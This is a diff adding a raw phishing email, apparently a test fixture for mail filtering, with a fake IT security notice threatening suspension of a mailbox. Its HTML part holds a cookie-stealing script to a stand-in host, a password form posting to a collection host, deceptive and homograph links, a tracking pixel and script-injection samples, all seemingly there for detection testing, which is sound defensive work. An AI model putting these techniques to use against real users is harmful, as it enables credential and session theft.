@@ -1,0 +1,38 @@
+Return-Path: <notice@security-alerts-demo.example>
+Received: from mail.sender-demo.example (mail.sender-demo.example [192.0.2.10])
+	by mx1.contoso-demo.example (Postfix) with ESMTPS id 4XyZ1;
+	Mon, 05 Oct 2026 08:14:22 +0100
+From: Contoso IT Security <notice@security-alerts-demo.example>
+To: ngozi.eze@contoso-demo.example
+Subject: Action required: your mailbox will be suspended
+Date: Mon, 05 Oct 2026 10:30:00 +0100
+Message-ID: <alert-5521@security-alerts-demo.example>
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="alt-03"
+
+--alt-03
+Content-Type: text/plain; charset="utf-8"
+
+Your mailbox will be suspended within 24 hours. Verify your account password:
+https://portal.contoso-demo.example/login
+
+--alt-03
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+<html><head><meta http-equiv=3D"refresh" content=3D"30;url=3Dhttp://redirect.invali=
+d/next"><script>document.location=3D'http://steal.invalid/?c=3D'+document.cookie</s=
+cript></head>
+<body onload=3D"alert('x')">
+<img src=3D"http://tracker.invalid/pixel.gif?id=3Dngozi" width=3D"1" height=3D"1">
+<p>Your mailbox will be <b>suspended within 24 hours</b>. Verify your account password now.</p>
+<p><a href=3D"http://login-contoso-demo.invalid/verify?u=3Dngozi">https://portal.contoso-demo.example/login</a></p>
+<p>Backup link: <a href=3D"http://192.0.2.45:8080/owa/">Outlook Web Access</a></p>
+<p>Help centre: <a href=3D"https://c=D0=BEntoso-demo.example/help">https://contoso-demo.example/help</a></p>
+<p>Single sign-on: <a href=3D"https://portal.contoso-demo.example@sso-demo.invalid/auth">portal.contoso-demo.example</a></p>
+<form action=3D"http://collect.invalid/submit" method=3D"post"><input name=3D"password" type=3D"password"><button>Verify</button></form>
+<iframe src=3D"http://frame.invalid/"></iframe>
+<a href=3D"javascript:alert(1)">Unsubscribe</a>
+</body></html>
+
+--alt-03--
